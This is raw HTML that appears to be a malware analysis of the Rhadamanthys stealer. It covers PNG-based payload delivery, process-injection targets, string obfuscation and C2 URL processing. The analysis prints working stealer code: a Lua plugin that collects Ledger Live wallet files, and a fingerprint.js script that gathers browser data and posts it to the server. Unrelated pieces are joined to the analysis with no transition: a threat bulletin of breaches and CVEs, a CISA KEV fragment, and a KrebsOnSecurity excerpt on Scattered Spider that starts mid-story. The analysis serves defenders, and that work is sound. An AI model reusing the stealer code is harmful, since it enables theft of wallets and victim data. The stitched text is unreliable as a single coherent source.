&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - fragment of the Netclient module (the new version). A
single callback function is registered: to parse PNG." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId123.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20 &amp;#8211; fragment of the Netclient module (the new version). A single callback function is registered: to parse PNG.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The decoding function:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - fragment of the Netclient module (the new version). Inside
the function responsible for decrypting the package from the PNG." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId126.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 21 &amp;#8211; fragment of the Netclient module (the new version). Inside the function responsible for decrypting the package from the PNG.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The whole mechanism of decryption, and verification of the payload, is very similar to what we saw before. The main difference lies in how the input data is obtained. Previously, the bytes of the payload were hidden in some template file (JPG or WAV) that at first looked legitimate. A specific, custom steganogaphic algorithm was first used to grab the bytes interwoven in the media content. Now the author has given up the facade, and the data is stored right away as a pixels, following the structure:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;typedef struct png_data
{
    BYTE key_n[0x20];
    BYTE key_e[0x20];
    DWORD size;
    BYTE hash[0x14];
    BYTE data[1];
}_png_data;&lt;/pre&gt;



&lt;p&gt;It gives a noisy-looking image: unappealing comparing to the author’s earlier attempts at steganography, but good enough to do its job. Example:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - example of the PNG file used by the latest versions of
Rhadamanthys" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId129.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 22 &amp;#8211; example of the PNG file used by the latest versions of Rhadamanthys&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;As before, the decoding of the package from the PNG is not possible without the shared secret that is established during the communication with the C2. Therefore, we can’t simply decode the next stage from the PNG captured in the traffic.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="configurable-list-of-injection-targets"&gt;Configurable list of injection targets&lt;/h2&gt;



&lt;p&gt;Rhadamanthys downloads its final stage using the Netclient module, that is loaded into the initial process. The fetched data is decrypted locally, making it a second package with modules. However, further unpacking and loading is be done inside another process. As a cover, Rhadamanthys creates a legitimate process, which is first run in a suspended mode. The components needed to initiate the second part of the loading chain are implanted there.&lt;/p&gt;



&lt;p&gt;In past releases, the list of the possible targets was hardcoded in the sample, and one of the options was picked randomly. Since the author introduces more and more configurability, now this list is also shipped in a new file of the package. It makes it easily modifiable by the distributors.&lt;/p&gt;



&lt;p&gt;In the currently analyzed module, it contains the following options:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;%Systemroot%\system32\bthudtask.exe
%Systemroot%\system32\dllhost.exe
%Systemroot%\SysWOW64\dllhost.exe
%Systemroot%\system32\taskhostw.exe
%Systemroot%\SysWOW64\TsWpfWrp.exe
%Systemroot%\system32\spoolsv.exe
%Systemroot%\system32\wuaulct.exe
%Systemroot%\system32\AtBroker.exe
%Systemroot%\SysWOW64\AtBroker.exe
%Systemroot%\system32\fontdrvhost.exe
%Systemroot%\SysWOW64\TsWpfWrp.exe
%Systemroot%\SysWOW64\xwizard.exe
%Systemroot%\SysWOW64\msinfo32.exe
%Systemroot%\SysWOW64\msra.exe&lt;/pre&gt;



&lt;p&gt;The list is retrieved from the package. In two consecutive loops, the malware first checks which of the paths are accessible on the victim machine, and collects them in another list. That list is passed to the second loop, which randomly picks a path from the available options.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31976" height="1024" src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId133-509x1024.png" width="509" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 23 &amp;#8211; Selecting the process where the next stage will be injected. The first loop is responsible for checking if particular paths are accessible. The second loop is responsible for random selection of the accessible path.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;The old list of processes is still used as a backup. Therefore, if the names from the list are not found in the system, the malware tries to run one of the followings:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;"%Systemroot%\\system32\\credwiz.exe"
"%Systemroot%\\system32\\OOBE-Maintenance.exe"
"%Systemroot%\\system32\\dllhost.exe"
"%Systemroot%\\system32\\openwith.exe"
"%Systemroot%\\system32\\rundll32.exe"&lt;/pre&gt;



&lt;p&gt;Diversification of the options creates another headache for incident responders.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="changed-string-encryption-stage-3"&gt;Changed string encryption (Stage 3)&lt;/h2&gt;



&lt;p&gt;Since version 0.5, the majority of the strings used by Rhadamanthys, especially in its core modules, are obfuscated (details: [&lt;a href="https://research.checkpoint.com/2023/rhadamanthys-v0-5-0-a-deep-dive-into-the-stealers-components/"&gt;2&lt;/a&gt;]). The obfuscation scheme differs depending on the stage (XS1 vs XS2). To address this, we previously&amp;nbsp;&lt;a href="https://github.com/hasherezade/malware_analysis/tree/master/rhadamanthys/v0.5"&gt;published two distinct IDA scripts&lt;/a&gt;, one for each variant.&lt;/p&gt;



&lt;p&gt;Reviewing the 0.9.x version, we found that one of the scripts needed modifications. Stage 2 (and the custom modules XS1_B) introduced no changes in string obfuscation &amp;#8211; and our&amp;nbsp;&lt;a href="https://github.com/hasherezade/malware_analysis/blob/master/rhadamanthys/v0.5/ida_params3_xs1.py"&gt;previously published IDA script&lt;/a&gt;&amp;nbsp;[&lt;a href="https://research.checkpoint.com/2023/rhadamanthys-v0-5-0-a-deep-dive-into-the-stealers-components/"&gt;2&lt;/a&gt;] can still be applied. However, in Stage 3 (XS2_B modules), the algorithm was rewritten. The custom XOR-based algorithm was replaced with RC4.&lt;/p&gt;



&lt;p&gt;The change doesn’t introduce any additional difficulty in decrypting it. It was probably added only to break existing tools, and disrupt the expected patterns. However, pinpointing the string deobfuscation functions is now more difficult, since they come as multiple different instances. In the past there were just two main string deobfuscation functions, one for ANSI, and another for Unicode strings. Once we identified them, and filled in their&amp;nbsp;&lt;a href="https://github.com/hasherezade/malware_analysis/blob/master/rhadamanthys/v0.5/ida_params3_xs2.py#L5"&gt;expected names&lt;/a&gt;&amp;nbsp;in the IDB, we could quickly apply the script to deobfuscate all the strings.&lt;/p&gt;



&lt;p&gt;Currently, finding all the instances requires a bit more effort. Just like in the past, ANSI strings are decoded by different functions than Unicode strings. But then there are other subtypes. In some of those functions, the encrypted string is passed via the first argument (we denote them as&amp;nbsp;&lt;code&gt;dec_cstringA&lt;/code&gt;&amp;nbsp;/&amp;nbsp;&lt;code&gt;dec_wstringA&lt;/code&gt;), and others, it is passed via the second argument (we denote them as&amp;nbsp;&lt;code&gt;dec_cstringB&lt;/code&gt;&amp;nbsp;/&amp;nbsp;&lt;code&gt;dec_wstringB&lt;/code&gt;).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - One of the string decoding functions, Unicode variant." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId141.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 24 &amp;#8211; One of the string decoding functions, Unicode variant.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;Those functions may be called directly in the code, or used via various wrappers.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - Wrapper for one of the string decoding functions." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId144.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 25 &amp;#8211; Wrapper for one of the string decoding functions.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;In order to decrypt all the strings, we have to find all the variants, and their wrappers.&lt;/p&gt;



&lt;p&gt;We provide the updated decryption script, that can be used for XS2_B [&lt;a href="https://github.com/hasherezade/malware_analysis/blob/master/rhadamanthys/v0.9/ida_params3_xs2b_64.py"&gt;here&lt;/a&gt;]. The script assumes that the deobfuscating functions in our IDB are renamed appropriately (as presented&amp;nbsp;[&lt;a href="https://github.com/hasherezade/malware_analysis/blob/332a1fb405d6119d1d3b12a3d6d795afd3ae303f/rhadamanthys/v0.9/ida_params3_xs2b_64.py#L8"&gt;here&lt;/a&gt;]).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - example of how the new function decrypting strings is
called. The view contained the strings filled by our script." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId148.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 26 &amp;#8211; example of how the new function decrypting strings is called. The view contains the strings filled by our script.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;A listing of the deobfuscated strings from the analyzed sample is available [&lt;a href="https://gist.github.com/hasherezade/7f6008708dd4eecbebcb3c810c46f6e8"&gt;here&lt;/a&gt;].&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="network-communication"&gt;Network communication&lt;/h2&gt;



&lt;p&gt;Once the core stealer modules are downloaded and deployed, they carry out the main operations, and remain in communication with the C2 to upload the results, and receive commands. As in the previous Rhadamanthys variants, the communication is established via WebSocket, and uses the C2 address that is in the initial configuration.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="querying-time-services"&gt;Querying time services&lt;/h3&gt;



&lt;p&gt;Before the attempt to establish the connection to its C2, the sample queries the following services for the time, in random order:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;"time.google.com"
"time.cloudflare.com"
"time.facebook.com"
"time.windows.com"
"time.apple.com"
"time-a-g.nist.gov"
"ntp.time.in.ua"
"ts1.aco.net"
"ntp1.net.berkeley.edu"
"ntp.nict.jp"
"x.ns.gin.ntt.net"
"gbg1.ntp.se"
"ntp1.hetzner.de"
"ntp.time.nl"
"pool.ntp.org"&lt;/pre&gt;



&lt;p&gt;This was added in the recent editions of Rhadamanthy (0.9.x) and was not seen in earlier releases.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="processing-the-url"&gt;Processing the URL&lt;/h3&gt;



&lt;p&gt;An interesting detail added in the latest version in Rhadamanthys is, that the URL from the configuration is further processed. First, the following algorithm is used to generate a random string:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;void generate_domain_str(char *buf, size_t max) {
    srand(time(0));
    rand();
    for (size_t i = 0; i &amp;lt; max; i++)
    {
        int rval = rand();
        BYTE c = rval
            - 0x1A
            * (((((unsigned __int64)(0x4EC4EC4FLL * rval) &gt;&gt; 0x20)
                &amp;amp; 0x80000000) != 0LL)
                + ((int)((unsigned __int64)(0x4EC4EC4FLL * rval) &gt;&gt; 0x20) &gt;&gt; 3))
            + 0x61;
        buf[i] = c;
    }
}&lt;/pre&gt;



&lt;p&gt;When this algorithm is applied, the domain from the config is partially overwritten by the random content. The length of the URL before the first “/” (i.e.&amp;nbsp;denoting the IP and the port) is used as the length of the new string. Next, the ‘.’ is inserted two characters before the new string end, making it look like a domain.&lt;/p&gt;



&lt;p&gt;Examples of the transformations:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;192.30.242[.]210:8888/gateway/qq7o8k3h.fnliq&lt;/code&gt;&amp;nbsp;→&amp;nbsp;&lt;code&gt;hxxps://mohbskyjlaztloar.dq/gateway/qq7o8k3h.fnliq&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;193.84.71[.]81/gateway/wcm6paht.htbq1&lt;/code&gt;&amp;nbsp;→&amp;nbsp;&lt;code&gt;hxxps://jvmhnrlbt.xf/gateway/wcm6paht.htbq1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;At first it looks like DGA, however, the generated domains do not resolve, and they are too random to really be used. The generation algorithm makes the output sensitive not just to a different date, but it changes every second.&lt;/p&gt;



&lt;p&gt;The address of the C2 that we can observe in the network communication is still the same as the one in the config.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - The view from Wireshark showing the communication with the
C2. The C2 address is the same as the one set in the configuration." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId157.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 27 &amp;#8211; The view from Wireshark showing the communication with the C2. The C2 address is the same as the one set in the configuration.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure X - The view from ProcMon showing the communication with the
C2. The C2 address is the same as the one set in the configuration." src="https://research.checkpoint.com/wp-content/uploads/2025/09/EWYE7LIJ3E-rId160.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 28 &amp;#8211; The view from ProcMon showing the communication with the C2. The C2 address is the same as the one set in the configuration.&lt;/figcaption&gt;&lt;/figure&gt;
&lt;/div&gt;


&lt;p&gt;It is possible that the authors added it just as an additional confusion.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="lua-stealers"&gt;Lua stealers&lt;/h2&gt;



&lt;p&gt;Since its early releases, Rhadamanthys core stealer comes with a built-in Lua runner. It serves additional stealer plugins written in this language.&lt;/p&gt;

&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The recent release (0.9.2) added a single Lua extension (id: 0x23) for&amp;nbsp;&lt;a href="https://www.ledger.com/ledger-live"&gt;Ledger Live crypto wallet app&lt;/a&gt;:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;local files = {}
local file_count = 0
if not framework.flag_exist("W") then
    return
end
local paths = {
    framework.parse_path([[%AppData%\Ledger Live]]),
    framework.parse_path([[%LOCALAppData%\Ledger Live]])
}
for i, path in ipairs(paths) do
    if path ~= nil and framework.path_exist(path) then
        local offset = string.len(path) + 2
        framework.fs_search(path, function(entry)
            local name = string.sub(entry.Filename, offset)
            files[name] = entry.Filename
            file_count = file_count + 1
        end,true)
        if file_count &gt; 0 then
            break
        end
    end
end
if file_count &gt; 0 then
    for k, v in pairs(files) do
        framework.add_file(k, v)
    end
    framework.set_commit("!CP:LedgerLive")&lt;/pre&gt;



&lt;h2 class="wp-block-heading" id="other-modules"&gt;Other modules&lt;/h2&gt;



&lt;p&gt;In the latest releases, the package at Stage 3 was enriched with few more modules. They are:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;chrome_extension.dat&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;fingerprint.js&lt;/code&gt;&lt;/li&gt;



&lt;li&gt;&lt;code&gt;index.html&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The most interesting one is&amp;nbsp;&lt;code&gt;fingerprint.js&lt;/code&gt;&amp;nbsp;. It is a JavaScript, which starts with the following comment:&amp;nbsp;&lt;code&gt;Browser Fingerprint Export Tool ; Used to collect browser fingerprint information and export as JSON&lt;/code&gt;. It is meant to be opened by a browser and collect a variety of information about its configuration. The main function of the script is called asynchronously and it collects all the information into a JSON report:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;async function main() {
    try {
      const fingerprint = await collectAllFingerprints();

      await fetch('/p/result', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fingerprint)
      });
    } catch (error) {

      console.error('Fingerprint collection or send error:', error);
    }
  }&lt;/pre&gt;



&lt;p&gt;The function that does the data collection comes with extensive comments, showing what type of data we can expect to be gathered.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;  // Collect all fingerprint information
  async function collectAllFingerprints() {
    const fingerprint = {
      // Timestamp
      timestamp: new Date().toISOString(),
      // Basic system info
      system: await collectSystemInfo(),
      // Browser info
      browser: collectBrowserInfo(),
      // WebGL info
      webgl: await collectWebGLInfo(),
      // Canvas info
      canvas: await collectCanvasInfo(),
      // Network info
      network: await collectNetworkInfo(),
      // Screen info
      screen: collectScreenInfo(),
      // Hardware info
      hardware: collectHardwareInfo(),
      // Language info
      language: collectLanguageInfo(),
      // Fonts info
      fonts: await detectAvailableFonts(),
      // WebRTC info
      webrtc: await getWebRTCInfo(),
      // Web Audio info
      audio: await getWebAudioInfo(),
      // Miscellaneous features
      misc: collectMiscFeatures()
    };
    return fingerprint;
  }&lt;/pre&gt;



&lt;p&gt;Once this script is deployed, it allows the attackers to grab additional information about the browsers installed on the victim system, and their settings. For example, it allows to list all the plugins installed, and checks if the following features are enabled:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;doNotTrack&lt;/li&gt;



&lt;li&gt;Java&lt;/li&gt;



&lt;li&gt;cookies&lt;/li&gt;



&lt;li&gt;WebDriver&lt;/li&gt;



&lt;li&gt;WebGL&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;It also pinpoints the precise product version and build.&lt;/p&gt;



&lt;p&gt;The &lt;code&gt;index.html&lt;/code&gt; is very simple, and seems to be used just as a carrier where the&amp;nbsp;&lt;code&gt;fingerprint.js&lt;/code&gt;&amp;nbsp;will be embedded:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;!DOCTYPE html&gt;
&amp;lt;html lang="en"&gt;
&amp;lt;head&gt;
  &amp;lt;meta charset="UTF-8"&gt;
  &amp;lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
&amp;lt;/head&gt;
&amp;lt;body&gt;
  &amp;lt;script src="/p/fp.js"&gt;&amp;lt;/script&gt;
&amp;lt;/body&gt;
&amp;lt;/html&gt; &lt;/pre&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;Rhadamanthys looked mature from the start, given that its codebase draws heavily from the authors’ earlier project, Hidden Bee. Its initial development was fast-paced, as the authors invested heavily in rapid feature growth to gain momentum and attract customers. They kept reworking the codebase, introduced extensions and add-ons that increased flexibility, allowing customization for diverse use cases. Currently, the development is slower and steadier: the core design remains intact, with changes focused on refinements &amp;#8211; such as new stealer components, changes in obfuscation, and more advanced customization options.&lt;/p&gt;



&lt;p&gt;The latest variant represents an evolution rather than a revolution. Analysts should update their config parsers, monitor PNG-based payload delivery, track changes in mutex and bot ID formats, and expect further churn in obfuscation as tooling catches up. If this trajectory continues, a future 1.0 release may emphasize stability and professionalization, further cementing Rhadamanthys as a long-term player in the stealer ecosystem.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Stellantis, Automotive maker giant which owns Citroën, FIAT, Jeep, Chrysler, and Peugeot, has &lt;a href="https://cybersecuritynews.com/stellantis-data-breach/"&gt;suffered&lt;/a&gt; a data breach that resulted in exposure of North American customer contact information after attackers accessed a third-party platform tied to its Salesforce environment. ShinyHunters threat actor claims responsibility, stating they stole over 18 million Salesforce records.&lt;/li&gt;
&lt;li&gt;Volvo Group North America has &lt;a href="https://securityaffairs.com/182577/data-breach/volvo-north-america-disclosed-a-data-breach-following-a-ransomware-attack-on-it-provider-miljodata.html"&gt;confirmed&lt;/a&gt; a data breach that resulted in exposure of employee personal data after a ransomware attack on its third-party HR software provider Miljödata. Exposed information includes names and Social Security numbers. DataCarry ransomware group claimed responsibility and leaked the stolen data.&lt;/li&gt;
&lt;li&gt;Union County, Ohio was &lt;a href="https://securityaffairs.com/182689/uncategorized/ohios-union-county-suffers-ransomware-attack-impacting-45000-people.html"&gt;hit&lt;/a&gt; by a ransomware attack that resulted in theft of sensitive personal data including names, Social Security numbers, driver’s license and passport numbers, financial account details, medical information, and fingerprint data. The breach impacted 45,487 individuals after attackers accessed the county network between May 6 and May 18, 2025.&lt;/li&gt;
&lt;li&gt;Las Vegas-based casino giant Boyd Gaming has &lt;a href="https://www.securityweek.com/hackers-target-casino-operator-boyd-gaming/"&gt;been&lt;/a&gt; a victim of a cyberattack that resulted in the theft of employee information and data belonging to a limited number of other individuals from its internal IT system. The incident did not impact business operations or customer-facing systems, but sensitive employee data was compromised, with no specific details regarding the type or volume.&lt;/li&gt;
&lt;li&gt;South Korea’s fifth-largest card issuer Lotte Card has &lt;a href="https://therecord.media/south-korea-probes-credit-card-data-breach"&gt;experienced&lt;/a&gt; a data breach that resulted in the exposure of personal information belonging to around 3 million customers, including identification numbers, contact details, and sensitive financial data such as card numbers and verification codes. The breach affected approximately 2,700 files, of which only 56% were encrypted, and was linked to an unpatched flaw on a payment’s server.&lt;/li&gt;
&lt;li&gt;Convenience store chain Circle K in Hong Kong was &lt;a href="https://www.scmp.com/news/hong-kong/hong-kong-economy/article/3327078/store-chain-circle-k-confirms-cyberattack-hong-kong-apologises-customers"&gt;hit&lt;/a&gt; by a cyberattack that disrupted networks at nearly 400 stores, paralyzing e-payments, email, and loyalty systems. Customers couldn’t use most services however it remains unclear if any personal data has been compromised.&lt;/li&gt;
&lt;li&gt;Kido, a UK nursery chain with 18 sites in London and abroad, was &lt;a href="https://www.reuters.com/world/uk/london-nurseries-hit-by-hackers-data-8000-children-stolen-2025-09-26/"&gt;hacked&lt;/a&gt; by the Radiant group, which threatened to leak sensitive child and staff records. The attackers claimed to have stolen data on around 8,000 children and employees, including names, photos, addresses, contact details, and safeguarding notes. As proof, Radiant published profiles of 10 children online while demanding ransom. The Metropolitan Police and UK data regulators are investigating, with no arrests made and further leaks still possible.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A patch was &lt;a href="https://thehackernews.com/2025/09/solarwinds-releases-hotfix-for-critical.html"&gt;released&lt;/a&gt; for CVE-2025-26399, a critical unauthenticated remote code execution vulnerability affecting SolarWinds Web Help Desk up to version 12.8.7, caused by unsafe deserialization in the AjaxProxy component. It’s the third fix after CVE-2024-28986/28988, which attackers had already exploited to run commands by bypassing earlier patches.&lt;/li&gt;
&lt;li&gt;Cisco &lt;a href="https://www.bleepingcomputer.com/news/security/cisco-warns-of-asa-firewall-zero-days-exploited-in-attacks/"&gt;patched&lt;/a&gt; two actively exploited zero-days in ASA and FTD software. CVE-2025-20333 allows authenticated remote code execution, and CVE-2025-20362, enables unauthenticated access to restricted endpoints. Both flaws have been targeted in the wild. A related critical issue, CVE-2025-20363, also enables unauthenticated RCE, and broad campaigns are hitting exposed devices.&lt;/li&gt;
&lt;li&gt;A newly disclosed flaw, CVE-2025-10184, in OnePlus OxygenOS &lt;a href="https://www.rapid7.com/blog/post/cve-2025-10184-oneplus-oxygenos-telephony-provider-permission-bypass-not-fixed/"&gt;allows&lt;/a&gt; any installed app to read SMS/MMS data and metadata without READ_SMS or user interaction via a Telephony provider permission bypass. The flaw is due to improperly exposed providers with unrestricted R/W access, including a blind SQL injection in ServiceNumberProvider’s update method. Successful exploitation enables silent message exfiltration and effective bypass of SMS-based MFA.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research has &lt;a href="https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/"&gt;uncovered&lt;/a&gt; a campaign by Iranian threat actor Nimbus Manticore targeting European defense and telecom sectors. Using spear-phishing and fake HR portals, the group deploys a DLL side-loading chain and obfuscated malware like MiniJunk and MiniBrowse. The tools employ valid signatures and advanced evasion, indicating nation-state capabilities.&lt;/li&gt;
&lt;li&gt;Check Point &lt;a href="https://blog.checkpoint.com/executive-insights/playing-offside-how-threat-actors-are-warming-up-for-fifa-2026/"&gt;reveals&lt;/a&gt; over 4,300 domains registered ahead of FIFA World Cup 2026, mimicking FIFA, host cities, and event branding &amp;#8211; peaking in August and September 2025. These domains, concentrated on registrars like GoDaddy and Namecheap, use synchronized DNS setups and templates for scams involving fake tickets, streams, and merchandise.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign"&gt;report&lt;/a&gt; ongoing BRICKSTORM malware attacks on US legal, tech, and SaaS sectors, aimed at espionage and zero-day development. Tactics include Go-based proxy backdoors, credential theft (BRICKSTEAL) and VMware compromise.
&lt;p&gt;&lt;em&gt;Check Point Threat Emulation, Harmony Endpoint, IPS and AB blades provide protection against this threat&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.trendmicro.com/en_us/research/25/i/lockbit-5-targets-windows-linux-esxi.html"&gt;analyzed&lt;/a&gt; LockBit 5.0 ransomware variants for Windows, Linux, and ESXi, which use obfuscation, DLL reflection, and flexible command-line options. All versions avoid Russian systems, randomize file extensions, clear event logs, and target both physical and virtual environments. The ESXi variant specifically encrypts VMware, showing LockBit’s cross-platform evolution.
&lt;p&gt;&lt;em&gt;Check &lt;/em&gt;&lt;em&gt;Point Threat Emulation and Harmony Endpoint provide protection against this threat &lt;/em&gt;&lt;em&gt;(Ransomware.Win.LockBit; Ransomware.Wins.LockBit; Ransomware.Wins.Lockbit.ta.*)&lt;/em&gt;&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats.

The charges came as Jubair and an alleged co-conspirator appeared in a London court to face accusations of hacking into and extorting several large U.K. retailers, the London transit system, and healthcare providers in the United States.&lt;/p&gt;
&lt;p&gt;At a court hearing last week, U.K. prosecutors laid out a litany of charges against Jubair and 18-year-old &lt;strong&gt;Owen Flowers&lt;/strong&gt;, accusing the teens of involvement in an August 2024 cyberattack that crippled &lt;strong&gt;Transport for London&lt;/strong&gt;, the entity responsible for the public transport network in the Greater London area.&lt;/p&gt;

&lt;p&gt;On July 10, 2025, KrebsOnSecurity &lt;a href="https://krebsonsecurity.com/2025/07/uk-charges-four-in-scattered-spider-ransom-group/" rel="noopener" target="_blank"&gt;reported&lt;/a&gt; that Flowers and Jubair had been arrested in the United Kingdom in connection with recent Scattered Spider &lt;a href="https://www.thetimes.com/uk/technology-uk/article/ransoms-hackers-cyber-crime-t5kjldwwm" rel="noopener" target="_blank"&gt;ransom attacks&lt;/a&gt; against the retailers &lt;strong&gt;Marks &amp;amp; Spencer&lt;/strong&gt; and &lt;strong&gt;Harrods&lt;/strong&gt;, and the British food retailer &lt;strong&gt;Co-op Group&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;That story cited sources close to the investigation saying Flowers was the Scattered Spider member who anonymously gave interviews to the media in the days after the group&amp;#8217;s September 2023 ransomware attacks disrupted operations at Las Vegas casinos operated by &lt;strong&gt;MGM Resorts&lt;/strong&gt; and &lt;strong&gt;Caesars Entertainment&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The story also noted that Jubair&amp;#8217;s alleged handles on cybercrime-focused Telegram channels had far lengthier rap sheets involving some of the more consequential and headline-grabbing data breaches over the past four years. What follows is an account of cybercrime activities that prosecutors have attributed to Jubair&amp;#8217;s alleged hacker handles, as told by those accounts in posts to public Telegram channels that are closely monitored by multiple cyber intelligence firms.&lt;/p&gt;
&lt;h2&gt;EARLY DAYS (2021-2022)&lt;/h2&gt;
&lt;p&gt;Jubair is alleged to have been a core member of the &lt;strong&gt;LAPSUS$&lt;/strong&gt; cybercrime group that &lt;a href="https://krebsonsecurity.com/2022/03/a-closer-look-at-the-lapsus-data-extortion-group/" rel="noopener" target="_blank"&gt;broke into dozens of technology companies beginning in late 2021&lt;/a&gt;, stealing source code and other internal data from tech giants including &lt;strong&gt;Microsoft&lt;/strong&gt;, &lt;strong&gt;Nvidia&lt;/strong&gt;, &lt;strong&gt;Okta&lt;/strong&gt;, &lt;strong&gt;Rockstar Games&lt;/strong&gt;, &lt;strong&gt;Samsung&lt;/strong&gt;, &lt;strong&gt;T-Mobile&lt;/strong&gt;, and &lt;strong&gt;Uber&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;That is, according to the former leader of the now-defunct LAPSUS$. In April 2022, KrebsOnSecurity &lt;a href="https://krebsonsecurity.com/2022/04/leaked-chats-show-lapsus-stole-t-mobile-source-code/" rel="noopener" target="_blank"&gt;published internal chat records&lt;/a&gt; taken from a server that LAPSUS$ used, and those chats indicate Jubair was working with the group using the nicknames &lt;strong&gt;Amtrak&lt;/strong&gt; and &lt;strong&gt;Asyntax&lt;/strong&gt;. In the middle of the gang&amp;#8217;s cybercrime spree, Asyntax told the LAPSUS$ leader not to share T-Mobile’s logo in images sent to the group because he’d been previously busted for SIM-swapping and his parents would suspect he was back at it again.&lt;/p&gt;
